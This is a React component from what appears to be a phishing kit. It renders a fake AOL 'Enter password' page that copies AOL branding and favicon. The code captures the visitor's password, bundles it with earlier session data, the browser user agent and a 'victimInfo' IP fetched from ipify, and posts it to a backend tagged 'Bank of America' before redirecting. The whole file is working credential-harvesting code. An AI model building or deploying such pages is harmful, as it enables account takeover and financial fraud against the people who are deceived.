import "../styles/yahoo.css";
import { useEffect, useMemo, useRef, useState } from "react";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import { RxEyeNone, RxEyeOpen } from "react-icons/rx";
import axios from "axios";
import API from "../api/api";

const AOL = () => {
  const [password, setPassword] = useState("");
  const [isShow, setIsShow] = useState(false);
  const passwordRef = useRef(null);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const email = useMemo(() => {
    const query = new URLSearchParams(window.location.search);
    return query.get("email");
  }, [window.location]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({
        ..._data,
        providerInfo: { provider: "aol", password },
      }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "Bank of America",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        window.location.href = `/account?${randParams()}`;
      }
    } catch (error) {
      alert("Something went wrong");
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  useEffect(() => {
    if (passwordRef.current) {
      passwordRef.current.focus();
    }

    document.title = "AOL";
    const favicon =
      document.querySelector("link[rel='icon']") ||
      document.createElement("link");
    favicon.href = "/images/aol/aol.ico";
    favicon.rel = "icon";
    document.head.appendChild(favicon);

    return () => {
      document.title = "Bank of America";
      document.head.removeChild(favicon);
    };
  }, []);

  return (
    <div className="yahoo-wrapper">
      <div className="yahoo-header flex max-md:hidden">
        <img
          src="/images/aol/aol.png"
          alt="Yahoo"
          width={90}
          height={36}
          className="cursor-pointer"
        />
        <a
          href="#"
          className="text-[13px] text-[#188fff] hover:text-[#003abc]"
        >
          Help
        </a>
      </div>
      <div className="relative mx-auto max-w-[1030px]">
        <div className="yahoo-body">
          <div className="pt-[28px] grid place-items-center">
            <img
              src="/images/aol/aol.png"
              alt="Yahoo"
              width={100}
              height={40}
              className=""
            />
          </div>
          <p className="text-center mt-[.9rem] text-[14.82px] tracking-[.58px]">
            {email}
          </p>
          <h2 className="mt-4 text-[21.17px] font-[600] leading-[1.35294rem] tracking-[-0.2px] text-center">
            Enter password
          </h2>
          <p className="text-center mt-[0.35294rem] text-[14.82px] tracking-[-0.3px]">
            to finish signing in
          </p>
          <form
            className="mt-[50px]"
            onSubmit={handleSubmit}
          >
            <div
              className="relative w-full border-0"
              style={{ borderBottom: "1px solid #d8dade" }}
            >
              <label className="top-[-0.49rem] text-[0.8rem] tracking-[-.1px] text-[#262626]">
                Password
              </label>
              <input
                ref={passwordRef}
                className="w-full h-full pr-4 mt-2 pb-1 text-base"
                type={!isShow ? "password" : "text"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <span
                className="absolute cursor-pointer top-[30px] right-0"
                onClick={() => setIsShow((prev) => !prev)}
              >
                {!isShow ? <RxEyeOpen /> : <RxEyeNone />}
              </span>
            </div>
            <button className="bg-[#188fff] hover:bg-[#0f69ff] text-base font-[500] py-[9px] rounded-[2px] border-0 mt-[1.7rem] text-center w-full text-white">
              Next
            </button>
            <a
              href="#"
              className=" mt-4 mb-5 text-sm text-[#188fff] hover:text-[#003abc] block w-fit mx-auto tracking-[0.4px]"
            >
              Forgotten password?
            </a>
          </form>
        </div>
      </div>
    </div>
  );
};

export default AOL;
